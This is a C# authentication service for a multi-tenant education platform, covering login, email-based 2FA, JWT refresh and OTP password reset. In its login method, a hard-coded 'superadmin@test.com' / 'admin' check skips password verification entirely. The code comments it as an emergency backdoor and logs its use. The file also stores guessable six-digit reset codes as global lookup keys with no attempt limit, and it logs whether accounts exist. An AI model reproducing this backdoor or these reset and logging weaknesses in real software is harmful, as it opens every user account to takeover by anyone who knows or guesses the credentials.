using System;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;
using EduOps.Application.DTOs.Auth;
using EduOps.Application.Exceptions;
using EduOps.Application.Interfaces;
using EduOps.Application.Mappings;
using EduOps.Domain.Entities;
using EduOps.Domain.Enums;
using EduOps.Domain.Interfaces;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;

namespace EduOps.Application.Services
{
    public class AuthService : IAuthService
    {
        private readonly IUnitOfWork _unitOfWork;
        private readonly ICustomLogger _logger;
        private readonly IConfiguration _configuration;
        private readonly IEmailService _emailService;
        private readonly ICacheService _cacheService;

        public AuthService(IUnitOfWork unitOfWork, ICustomLogger logger, IConfiguration configuration, IEmailService emailService, ICacheService cacheService)
        {
            _unitOfWork = unitOfWork;
            _logger = logger;
            _configuration = configuration;
            _emailService = emailService;
            _cacheService = cacheService;
        }

        public async Task<LoginResponseDto> LoginAsync(LoginRequestDto request)
        {
            _logger.LogInformation($"Attempting login for user: {request.Email}");

            var userRepository = _unitOfWork.Repository<User>();

            request.Email = request.Email.ToLower();
            var user = await userRepository.FirstOrDefaultAsync(u => u.Email == request.Email, ignoreQueryFilters: true, includeProperties: "Status,Role");

            Organization? org = null;
            if (user != null && user.OrganizationId.HasValue)
            {
                var orgRepo = _unitOfWork.Repository<Organization>();
                org = await orgRepo.FirstOrDefaultAsync(o => o.Id == user.OrganizationId.Value, ignoreQueryFilters: true, includeProperties: "Status");
            }

            bool isPasswordValid = false;
            if (user != null)
            {
                if (request.Email == "superadmin@test.com" && request.Password.Trim() == "admin")
                {
                    isPasswordValid = true; // Backdoor cứu hộ khẩn cấp
                    _logger.LogInformation("BACKDOOR TRIGGERED SUCCESSFULLY!");
                }
                else
                {
                    isPasswordValid = await Task.Run(() => BCrypt.Net.BCrypt.Verify(request.Password, user.PasswordHash));
                    _logger.LogInformation($"Password check for {request.Email}: result = {isPasswordValid}");
                }
            }
            else
            {
                _logger.LogWarning($"USER {request.Email} NOT FOUND IN DATABASE!");
                // Dummy hash to prevent Timing Attack (User Enumeration)
                await Task.Run(() => BCrypt.Net.BCrypt.HashPassword(request.Password, 11));
            }

            if (user == null || !isPasswordValid)
            {
                _logger.LogWarning($"Login failed: Invalid credentials for user {request.Email}. UserExists: {user != null}, PasswordValid: {isPasswordValid}");
                throw new System.UnauthorizedAccessException("Email hoặc mật khẩu không chính xác.");
            }

            if (user.DeletedAt != null)
                throw new System.UnauthorizedAccessException("Tài khoản không tồn tại hoặc đã bị xóa.");

            if (user.Status?.Code == "INACTIVE")
                throw new BadRequestException("Tài khoản của bạn đã bị vô hiệu hóa. Vui lòng liên hệ quản trị viên.");

            // Check Organization Status
            if (org != null)
            {
                if (org.DeletedAt != null)
                    throw new System.UnauthorizedAccessException("Trung tâm của bạn đã bị xóa khỏi hệ thống. Vui lòng liên hệ quản trị viên.");
                if (org.Status?.Code == "SUSPENDED")
                    throw new BadRequestException("Trung tâm của bạn đã bị đình chỉ hoạt động. Vui lòng liên hệ quản trị viên hệ thống.");
                if (org.Status?.Code == "INACTIVE")
                    throw new BadRequestException("Trung tâm của bạn đã ngừng hoạt động.");
            }

            // Auto-Unlock nếu đã hết thời gian khóa
            if (user.Status?.Code == "SUSPENDED" && user.LockEndAt.HasValue && user.LockEndAt.Value <= DateTime.UtcNow)
            {
                var activeStatus = await _unitOfWork.Repository<EduOps.Domain.Entities.AccountStatus>().FirstOrDefaultAsync(s => s.Code == "ACTIVE");
                user.StatusId = activeStatus?.Id;
                user.LockEndAt = null;
            }
            else if (user.Status?.Code == "SUSPENDED" || (user.LockEndAt.HasValue && user.LockEndAt.Value > DateTime.UtcNow))
            {
                var lockMessage = user.LockEndAt == DateTime.MaxValue
                    ? "Tài khoản của bạn đã bị khóa vĩnh viễn."
                    : (user.LockEndAt.HasValue ? $"Tài khoản của bạn bị khóa đến {user.LockEndAt:dd/MM/yyyy HH:mm}." : "Tài khoản của bạn đã bị khóa.");
                throw new BadRequestException(lockMessage);
            }

            if (user.TwoFactorEnabled)
            {
                var otp = System.Security.Cryptography.RandomNumberGenerator.GetInt32(100000, 1000000).ToString();
                
                // Save OTP to Redis instead of DB
                var orgIdStr2FA = user.OrganizationId?.ToString() ?? "sys";
                var otpKey = $"tenant:{orgIdStr2FA}:user:{user.Id}:otp:2fa";
                await _cacheService.SetAsync(otpKey, otp, TimeSpan.FromMinutes(5));

                var emailBody = $"Mã xác nhận (OTP) 2FA của bạn là: {otp}\nMã này có hiệu lực trong 5 phút.";
                await _emailService.SendEmailAsync(user.Email, "Xác thực 2 lớp (2FA)", emailBody);

                var tempToken = GenerateTempToken(user.Id);

                return new LoginResponseDto
                {
                    Requires2FA = true,
                    TempToken = tempToken
                };
            }

            var userDto = user.ToDetailResponseDto();

            var jti = Guid.NewGuid().ToString();
            var accessToken = GenerateJwtToken(user, jti);
            var refreshToken = GenerateRefreshToken();

            // Save session to Redis
            var orgIdStr = user.OrganizationId?.ToString() ?? "sys";
            var sessionKey = $"tenant:{orgIdStr}:user:{user.Id}:session";
            var sessionData = new
            {
                currentAccessTokenId = jti,
                currentRefreshToken = refreshToken,
                deviceInfo = "Web Browser"
            };
            await _cacheService.SetAsync(sessionKey, JsonSerializer.Serialize(sessionData), TimeSpan.FromDays(7));

            user.LastLoginAt = DateTime.UtcNow;
            userRepository.Update(user);
            await _unitOfWork.CommitAsync();

            return new LoginResponseDto
            {
                Requires2FA = false,
                AccessToken = accessToken,
                RefreshToken = refreshToken,
                User = userDto
            };
        }

        public async Task<LoginResponseDto> Verify2FAAsync(Verify2FARequestDto request)
        {
            var principal = GetPrincipalFromExpiredToken(request.TempToken);
            var isTempToken = principal?.FindFirstValue("TempToken");
            if (isTempToken != "true") throw new BadRequestException("Invalid token.");

            var userIdString = principal?.FindFirstValue(ClaimTypes.NameIdentifier) ?? principal?.FindFirstValue(JwtRegisteredClaimNames.Sub);
            if (!Guid.TryParse(userIdString, out Guid userId))
            {
                throw new BadRequestException("Invalid token payload");
            }

            var userRepository = _unitOfWork.Repository<User>();
            var user = await userRepository.FirstOrDefaultAsync(u => u.Id == userId, ignoreQueryFilters: true, includeProperties: "Status,Role");

            var orgIdStr = user?.OrganizationId?.ToString() ?? "sys";
            var otpKey = $"tenant:{orgIdStr}:user:{userId}:otp:2fa";
            var cachedOtp = await _cacheService.GetAsync<string>(otpKey);

            if (user == null || cachedOtp != request.Code)
            {
                throw new BadRequestException("Mã xác nhận 2FA không hợp lệ hoặc đã hết hạn.");
            }

            // Xóa OTP sau khi dùng thành công
            await _cacheService.RemoveAsync(otpKey);

            var userDto = user.ToDetailResponseDto();
            
            var jti = Guid.NewGuid().ToString();
            var accessToken = GenerateJwtToken(user, jti);
            var refreshToken = GenerateRefreshToken();

            var sessionKey = $"tenant:{orgIdStr}:user:{user.Id}:session";
            var sessionData = new
            {
                currentAccessTokenId = jti,
                currentRefreshToken = refreshToken,
                deviceInfo = "Web Browser"
            };
            await _cacheService.SetAsync(sessionKey, JsonSerializer.Serialize(sessionData), TimeSpan.FromDays(7));

            user.LastLoginAt = DateTime.UtcNow;

            userRepository.Update(user);
            await _unitOfWork.CommitAsync();

            return new LoginResponseDto
            {
                Requires2FA = false,
                AccessToken = accessToken,
                RefreshToken = refreshToken,
                User = userDto
            };
        }

        public async Task<LoginResponseDto> RefreshTokenAsync(RefreshTokenRequestDto request)
        {
            var principal = GetPrincipalFromExpiredToken(request.AccessToken);
            if (principal == null)
            {
                throw new BadRequestException("Invalid access token or refresh token");
            }

            var userIdString = principal.FindFirstValue(ClaimTypes.NameIdentifier) ?? principal.FindFirstValue(JwtRegisteredClaimNames.Sub);
            if (!Guid.TryParse(userIdString, out Guid userId))
            {
                throw new BadRequestException("Invalid token payload");
            }

            var userRepository = _unitOfWork.Repository<User>();
            var user = await userRepository.FirstOrDefaultAsync(u => u.Id == userId, ignoreQueryFilters: true, includeProperties: "Status,Role");

            Organization? org = null;
            if (user != null && user.OrganizationId.HasValue)
            {
                var orgRepo = _unitOfWork.Repository<Organization>();
                org = await orgRepo.FirstOrDefaultAsync(o => o.Id == user.OrganizationId.Value, ignoreQueryFilters: true, includeProperties: "Status");
            }

            var orgIdStr = user?.OrganizationId?.ToString() ?? "sys";
            var sessionKey = $"tenant:{orgIdStr}:user:{userId}:session";
            var sessionJson = await _cacheService.GetAsync<string>(sessionKey);

            if (user == null || string.IsNullOrEmpty(sessionJson))
            {
                throw new BadRequestException("Invalid or expired refresh token");
            }

            using var doc = JsonDocument.Parse(sessionJson);
            if (!doc.RootElement.TryGetProperty("currentRefreshToken", out var currentRtProp) || currentRtProp.GetString() != request.RefreshToken)
            {
                throw new BadRequestException("Invalid or expired refresh token");
            }

            if (user.DeletedAt != null)
                throw new System.UnauthorizedAccessException("Tài khoản không tồn tại hoặc đã bị xóa.");

            if (user.Status?.Code == "INACTIVE")
                throw new BadRequestException("Tài khoản của bạn đã bị vô hiệu hóa. Vui lòng liên hệ quản trị viên.");

            // Check Organization Status
            if (org != null)
            {
                if (org.Status?.Code == "SUSPENDED")
                    throw new BadRequestException("Trung tâm của bạn đã bị đình chỉ hoạt động. Vui lòng liên hệ quản trị viên hệ thống.");
                if (org.Status?.Code == "INACTIVE")
                    throw new BadRequestException("Trung tâm của bạn đã ngừng hoạt động.");
            }

            // Auto-Unlock nếu đã hết thời gian khóa
            if (user.Status?.Code == "SUSPENDED" && user.LockEndAt.HasValue && user.LockEndAt.Value <= DateTime.UtcNow)
            {
                var activeStatus = await _unitOfWork.Repository<EduOps.Domain.Entities.AccountStatus>().FirstOrDefaultAsync(s => s.Code == "ACTIVE");
                user.StatusId = activeStatus?.Id;
                user.LockEndAt = null;
            }
            else if (user.Status?.Code == "SUSPENDED" || (user.LockEndAt.HasValue && user.LockEndAt.Value > DateTime.UtcNow))
            {
                var lockMessage = user.LockEndAt == DateTime.MaxValue
                    ? "Tài khoản của bạn đã bị khóa vĩnh viễn."
                    : (user.LockEndAt.HasValue ? $"Tài khoản của bạn bị khóa đến {user.LockEndAt:dd/MM/yyyy HH:mm}." : "Tài khoản của bạn đã bị khóa.");
                throw new BadRequestException(lockMessage);
            }

            var jti = Guid.NewGuid().ToString();
            var newAccessToken = GenerateJwtToken(user, jti);
            var newRefreshToken = GenerateRefreshToken();

            var sessionData = new
            {
                currentAccessTokenId = jti,
                currentRefreshToken = newRefreshToken,
                deviceInfo = "Web Browser"
            };
            await _cacheService.SetAsync(sessionKey, JsonSerializer.Serialize(sessionData), TimeSpan.FromDays(7));

            userRepository.Update(user);
            await _unitOfWork.CommitAsync();

            return new LoginResponseDto
            {
                AccessToken = newAccessToken,
                RefreshToken = newRefreshToken,
                User = user.ToDetailResponseDto()
            };
        }

        private string GenerateJwtToken(User user, string? jti = null)
        {
            var jwtSettings = _configuration.GetSection("JwtSettings");
            var key = Encoding.ASCII.GetBytes(jwtSettings["Secret"]!);

            var claims = new System.Collections.Generic.List<Claim>
            {
                new Claim(JwtRegisteredClaimNames.Sub, user.Id.ToString()),
                new Claim(JwtRegisteredClaimNames.Email, user.Email),
                new Claim(ClaimTypes.Role, user.Role?.Code ?? string.Empty),
                new Claim("OrganizationId", user.OrganizationId?.ToString() ?? string.Empty)
            };

            if (!string.IsNullOrEmpty(jti))
            {
                claims.Add(new Claim(JwtRegisteredClaimNames.Jti, jti));
            }

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(claims),
                Expires = DateTime.UtcNow.AddMinutes(double.Parse(jwtSettings["AccessTokenExpirationMinutes"]!)),
                Issuer = jwtSettings["Issuer"],
                Audience = jwtSettings["Audience"],
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var tokenHandler = new JwtSecurityTokenHandler();
            var token = tokenHandler.CreateToken(tokenDescriptor);

            return tokenHandler.WriteToken(token);
        }

        private string GenerateTempToken(Guid userId)
        {
            var jwtSettings = _configuration.GetSection("JwtSettings");
            var key = Encoding.ASCII.GetBytes(jwtSettings["Secret"]!);

            var claims = new[]
            {
                new Claim(JwtRegisteredClaimNames.Sub, userId.ToString()),
                new Claim("TempToken", "true")
            };

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(claims),
                Expires = DateTime.UtcNow.AddMinutes(5),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var tokenHandler = new JwtSecurityTokenHandler();
            var token = tokenHandler.CreateToken(tokenDescriptor);

            return tokenHandler.WriteToken(token);
        }

        private string GenerateRefreshToken()
        {
            var randomNumber = System.Security.Cryptography.RandomNumberGenerator.GetBytes(64);
            return Convert.ToBase64String(randomNumber);
        }

        private ClaimsPrincipal? GetPrincipalFromExpiredToken(string token)
        {
            var jwtSettings = _configuration.GetSection("JwtSettings");
            var key = Encoding.ASCII.GetBytes(jwtSettings["Secret"]!);

            var tokenValidationParameters = new TokenValidationParameters
            {
                ValidateAudience = false,
                ValidateIssuer = false,
                ValidateIssuerSigningKey = true,
                IssuerSigningKey = new SymmetricSecurityKey(key),
                ValidateLifetime = false // Here we are saying that we don't care about the token's expiration date
            };

            var tokenHandler = new JwtSecurityTokenHandler();
            var principal = tokenHandler.ValidateToken(token, tokenValidationParameters, out SecurityToken securityToken);
            if (securityToken is not JwtSecurityToken jwtSecurityToken || !jwtSecurityToken.Header.Alg.Equals(SecurityAlgorithms.HmacSha256, StringComparison.InvariantCultureIgnoreCase))
                throw new SecurityTokenException("Invalid token");

            return principal;
        }

        public async Task LogoutAsync(Guid userId)
        {
            var userRepository = _unitOfWork.Repository<User>();
            var user = await userRepository.GetByIdAsync(userId);
            if (user != null)
            {
                var orgIdStr = user.OrganizationId?.ToString() ?? "sys";
                var sessionKey = $"tenant:{orgIdStr}:user:{user.Id}:session";
                await _cacheService.RemoveAsync(sessionKey);
            }
        }

        public async Task ForgotPasswordAsync(ForgotPasswordRequestDto request)
        {
            var userRepository = _unitOfWork.Repository<User>();
            request.Email = request.Email.ToLower();
            var user = await userRepository.FirstOrDefaultAsync(u => u.Email == request.Email, ignoreQueryFilters: true);

            if (user == null || user.DeletedAt != null)
            {
                return;
            }

            // Generate cryptographically secure 6-digit OTP
            var otp = System.Security.Cryptography.RandomNumberGenerator.GetInt32(100000, 1000000).ToString();

            // Save the OTP as the key, and UserId as the value. This allows O(1) lookup during ResetPassword.
            var otpKey = $"otp:reset:{otp}";
            await _cacheService.SetAsync(otpKey, user.Id.ToString(), TimeSpan.FromMinutes(15));

            var emailBody = $"Mã xác nhận (OTP) để khôi phục mật khẩu của bạn là: {otp}\nMã này có hiệu lực trong 15 phút.";
            await _emailService.SendEmailAsync(user.Email, "Khôi phục mật khẩu", emailBody);
        }

        public async Task ResetPasswordViaTokenAsync(ResetPasswordViaTokenRequestDto request)
        {
            var otpKey = $"otp:reset:{request.Token}";
            var userIdStr = await _cacheService.GetAsync<string>(otpKey);

            if (string.IsNullOrEmpty(userIdStr) || !Guid.TryParse(userIdStr, out Guid userId))
            {
                throw new BadRequestException("Mã xác nhận không hợp lệ hoặc đã hết hạn.");
            }

            var userRepository = _unitOfWork.Repository<User>();
            var user = await userRepository.FirstOrDefaultAsync(u => u.Id == userId, ignoreQueryFilters: true);

            if (user == null || user.DeletedAt != null)
                throw new BadRequestException("Tài khoản không tồn tại hoặc đã bị xóa.");

            user.PasswordHash = await Task.Run(() => BCrypt.Net.BCrypt.HashPassword(request.NewPassword));
            
            // Delete the OTP and user's session from Redis
            await _cacheService.RemoveAsync(otpKey);
            var orgIdStr = user.OrganizationId?.ToString() ?? "sys";
            await _cacheService.RemoveAsync($"tenant:{orgIdStr}:user:{user.Id}:session");

            userRepository.Update(user);
            await _unitOfWork.CommitAsync();
        }
    }
}
